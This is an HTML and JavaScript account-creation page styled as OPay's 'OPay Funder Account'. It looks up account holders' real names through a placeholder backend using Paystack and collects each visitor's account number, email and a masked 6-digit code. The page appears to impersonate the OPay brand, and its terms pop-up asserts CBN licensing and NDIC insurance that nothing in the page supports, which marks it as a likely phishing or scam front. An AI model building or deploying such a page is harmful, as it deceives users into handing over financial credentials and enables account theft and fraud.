<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
    <title>OPay - Create Account</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', sans-serif;
            background: #ffffff;
            min-height: 100vh;
            padding: 16px 20px 40px;
            -webkit-user-select: none;
            user-select: none;
        }

        .create-container { max-width: 420px; width: 100%; margin: 0 auto; }

        .back-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 36px;
            height: 36px;
            background: #f0f2f5;
            border-radius: 50%;
            text-decoration: none;
            margin-bottom: 20px;
        }

        .back-btn i { font-size: 16px; color: #00B875; }
        .back-btn:active { transform: scale(0.95); }

        .logo-center { text-align: center; }
        .logo-center img { width: 150px; height: 150px; object-fit: contain; }

        .desc-text {
            font-size: 15px;
            color: #555;
            line-height: 1.45;
            margin-bottom: 12px;
            text-align: center;
        }

        .desc-text strong { color: #00B875; }

        .form-label {
            font-size: 12px;
            font-weight: 500;
            color: #888;
            margin-bottom: 6px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .form-label i { font-size: 12px; color: #bbb; }

        .phone-wrapper {
            display: flex;
            align-items: center;
            border: 1px solid #e0e4e8;
            border-radius: 12px;
            background: white;
        }

        .phone-wrapper:focus-within { border-color: #00B875; }

        .flag-area {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 0 12px;
            border-right: 1px solid #e0e4e8;
        }

        .flag-area img { width: 22px; height: 16px; }
        .flag-area span { font-size: 13px; font-weight: 500; color: #333; }

        .phone-input {
            flex: 1;
            border: none;
            padding: 12px 12px;
            font-size: 14px;
            background: transparent;
            border-radius: 12px;
        }

        .phone-input:focus { outline: none; }

        .name-display {
            background: #f6fef9;
            border-radius: 10px;
            padding: 10px 14px;
            margin: 12px 0;
            font-size: 12px;
            color: #555;
            border-left: 3px solid #00B875;
        }

        .name-display i { color: #00B875; margin-right: 6px; }
        .name-value { font-weight: 600; color: #00B875; font-size: 13px; }

        .form-input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #e0e4e8;
            border-radius: 12px;
            font-size: 14px;
        }

        .form-input:focus { outline: none; border-color: #00B875; }

        .signup-btn {
            background: #00B875;
            color: white;
            border: none;
            padding: 14px;
            font-size: 15px;
            font-weight: 600;
            border-radius: 30px;
            width: 100%;
            margin: 20px 0 12px;
        }

        .signup-btn:active { transform: scale(0.98); background: #00a066; }
        .signup-btn:disabled { opacity: 0.6; }

        .terms-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin: 12px 0;
        }

        .terms-checkbox { width: 16px; height: 16px; accent-color: #00B875; }
        .terms-text { font-size: 11px; color: #999; }
        .terms-link { color: #00B875; text-decoration: none; font-weight: 500; }

        .login-wrapper { text-align: center; margin-top: 20px; }
        .login-text { font-size: 12px; color: #aaa; }
        .login-link { color: #00B875; text-decoration: none; font-weight: 600; font-size: 12px; }

        .spinner-sm {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
            margin-right: 6px;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        @media (max-width: 480px) {
            .logo-center img { width: 100px; height: 100px; }
        }
    </style>
</head>
<body>
    <div class="create-container">
        <a href="login.html" class="back-btn">
            <i class="fas fa-chevron-left"></i>
        </a>

        <div class="logo-center">
            <img src="images/ppay.png" alt="OPay Logo">
        </div>

        <div class="desc-text">
            Get your <strong>OPay Funder Account</strong> here:<br>
            <span style="font-size:8px;">Enter your OPay account number to verify your identity</span>
        </div>

        <!-- Account Number -->
        <div>
            <div class="form-label">
                <i class="fas fa-mobile-alt"></i> OPay Account Number
            </div>
            <div class="phone-wrapper">
                <div class="flag-area">
                    <img src="https://flagcdn.com/ng.svg" alt="NG">
                    <span>+234 |</span>
                </div>
                <input type="tel" class="phone-input" id="accountNumber" placeholder="8012345678" maxlength="10" inputmode="numeric">
            </div>
        </div>

        <!-- Name Display - Will show REAL name from API -->
        <div class="name-display">
            <i class="fas fa-user"></i> Account Name: <span class="name-value" id="accountName">—</span>
        </div>

        <!-- Email -->
        <div style="margin-top: 12px;">
            <div class="form-label">
                <i class="fas fa-envelope"></i> Email Address
            </div>
            <input type="email" class="form-input" id="emailInput" placeholder="youremail@example.com">
        </div>

        <!-- 6-Digit Code -->
        <div style="margin-top: 12px;">
            <div class="form-label">
                <i class="fas fa-lock"></i> Enter 6-digit code
            </div>
            <input type="password" class="form-input" id="codeInput" maxlength="6" placeholder="••••••" inputmode="numeric">
        </div>

        <button class="signup-btn" id="signupBtn">
            SIGN UP
        </button>

        <div class="terms-wrapper">
            <input type="checkbox" class="terms-checkbox" id="termsCheckbox">
            <label class="terms-text" for="termsCheckbox">
                I have read and agree <a href="#" class="terms-link" id="termsLink">Terms and Conditions</a>
            </label>
        </div>

        <div class="login-wrapper">
            <span class="login-text">Already have OPay Funder Account?</span><br>
            <a href="#" class="login-link" id="loginLink">Click here to login <i class="fas fa-arrow-right"></i></a>
        </div>
    </div>

    <script>
        // ============ YOUR BACKEND API URL ============
        // After deploying your backend to Render, put the URL here
        const API_URL = 'https://your-backend-api.onrender.com/api/resolve-account';
        
        // ============ VIBRATION FUNCTION ============
        function vibratePhone(duration = 100, pattern = null) {
            if (window.navigator && window.navigator.vibrate) {
                if (pattern) window.navigator.vibrate(pattern);
                else window.navigator.vibrate(duration);
            }
        }
        
        // ============ GET REAL ACCOUNT NAME FROM PAYSTACK API ============
        async function getRealAccountName(accountNumber) {
            try {
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        account_number: accountNumber,
                        bank_code: 'opay'  // OPay bank code
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    return { success: true, name: data.account_name };
                } else {
                    return { success: false, message: data.message };
                }
            } catch (error) {
                console.error('API Error:', error);
                return { success: false, message: 'Network error. Please check your connection.' };
            }
        }
        
        // ============ SHOW ALERT WITH VIBRATION ============
        async function showAlert(icon, title, message, vibratePattern = null) {
            if (vibratePattern) vibratePhone(0, vibratePattern);
            else vibratePhone(200);
            
            return Swal.fire({
                icon: icon,
                title: title,
                text: message,
                confirmButtonColor: '#00B875',
                confirmButtonText: 'OK',
                timer: icon === 'success' ? 2000 : null
            });
        }
        
        // ============ DOM ELEMENTS ============
        const accountNumberInput = document.getElementById('accountNumber');
        const accountNameSpan = document.getElementById('accountName');
        const emailInput = document.getElementById('emailInput');
        const codeInput = document.getElementById('codeInput');
        const signupBtn = document.getElementById('signupBtn');
        const termsCheckbox = document.getElementById('termsCheckbox');
        const loginLink = document.getElementById('loginLink');
        const termsLink = document.getElementById('termsLink');
        
        let currentAccountName = '';
        let isVerifying = false;
        
        // ============ ACCOUNT NUMBER LOOKUP (REAL API) ============
        accountNumberInput.addEventListener('input', async function(e) {
            let val = this.value.replace(/\D/g, '').slice(0, 10);
            this.value = val;
            
            if (val.length === 10 && !isVerifying) {
                isVerifying = true;
                
                // Show loading
                accountNameSpan.textContent = 'Verifying with OPay...';
                accountNameSpan.style.color = '#e67e22';
                vibratePhone(50);
                
                // Call real API
                const result = await getRealAccountName(val);
                
                if (result.success) {
                    currentAccountName = result.name;
                    accountNameSpan.textContent = result.name;
                    accountNameSpan.style.color = '#00B875';
                    vibratePhone(0, [50, 50, 50]); // Success vibration pattern
                    await showAlert('success', 'Verified!', `Account name: ${result.name}`, [50, 50]);
                } else {
                    currentAccountName = '';
                    accountNameSpan.textContent = 'Account not found';
                    accountNameSpan.style.color = '#e74c3c';
                    vibratePhone(0, [200, 100, 200]); // Error vibration pattern
                    await showAlert('error', 'Not Found', result.message || 'Account number not found in OPay database', [200, 100]);
                }
                
                isVerifying = false;
                
            } else if (val.length > 0 && val.length < 10) {
                accountNameSpan.textContent = 'Enter 10 digits';
                accountNameSpan.style.color = '#e67e22';
                vibratePhone(100);
                currentAccountName = '';
            } else {
                accountNameSpan.textContent = '—';
                accountNameSpan.style.color = '#00B875';
                currentAccountName = '';
            }
        });
        
        // ============ CODE INPUT VALIDATION ============
        codeInput.addEventListener('input', function(e) {
            let val = this.value.replace(/\D/g, '').slice(0, 6);
            this.value = val;
            if (val.length === 6) vibratePhone(30);
        });
        
        // ============ SIGN UP BUTTON ============
        signupBtn.addEventListener('click', async function() {
            const accountNumber = accountNumberInput.value;
            const email = emailInput.value.trim();
            const code = codeInput.value;
            const terms = termsCheckbox.checked;
            
            // Validation
            if (accountNumber.length !== 10) {
                await showAlert('error', 'Invalid Account', 'Please enter a valid 10-digit OPay account number', [200, 100]);
                accountNumberInput.focus();
                return;
            }
            
            if (!currentAccountName) {
                await showAlert('error', 'Account Not Verified', 'Please wait for account verification to complete', [200, 100]);
                return;
            }
            
            if (!email || !email.includes('@') || !email.includes('.')) {
                await showAlert('error', 'Invalid Email', 'Please enter a valid email address', [200, 100]);
                emailInput.focus();
                return;
            }
            
            if (code.length !== 6) {
                await showAlert('error', 'Invalid Code', 'Please enter exactly 6 digits', [200, 100]);
                codeInput.focus();
                return;
            }
            
            if (!terms) {
                await showAlert('warning', 'Terms Required', 'Please accept the Terms and Conditions', [200, 100]);
                return;
            }
            
            // Show loading
            this.innerHTML = '<div class="spinner-sm"></div> Creating Account...';
            this.disabled = true;
            
            vibratePhone(0, [100, 50, 100]);
            
            // Save to localStorage
            const userData = {
                accountNumber: accountNumber,
                accountName: currentAccountName,
                email: email,
                passwordCode: code,
                createdAt: new Date().toISOString()
            };
            
            // Get existing users or create new array
            const existingUsers = JSON.parse(localStorage.getItem('opayUsers') || '[]');
            existingUsers.push(userData);
            localStorage.setItem('opayUsers', JSON.stringify(existingUsers));
            localStorage.setItem('currentUser', JSON.stringify(userData));
            
            await showAlert('success', 'Account Created!', `Welcome ${currentAccountName}!\n\nYour OPay Funder account is ready.`, [100, 50, 100, 150]);
            
            // Redirect to login page
            setTimeout(() => {
                window.location.href = 'login1.html';
            }, 1500);
        });
        
        // ============ NAVIGATION ============
        loginLink.addEventListener('click', (e) => {
            e.preventDefault();
            vibratePhone(50);
            window.location.href = 'login1.html';
        });
        
        termsLink.addEventListener('click', async (e) => {
            e.preventDefault();
            vibratePhone(0, [50, 50]);
            await showAlert('info', 'Terms & Conditions', 
                '📜 OPay Funder Terms:\n\n' +
                '• You must be 18+ years old\n' +
                '• One account per user\n' +
                '• OPay Funder is CBN licensed\n' +
                '• NDIC insured up to N500,000\n' +
                '• Your account name is verified via Paystack API',
                [50, 50]
            );
        });
        
        console.log('✓ OPay Create Account - REAL API Ready');
        console.log('✓ Will fetch real account names from Paystack');
    </script>
</body>
</html>
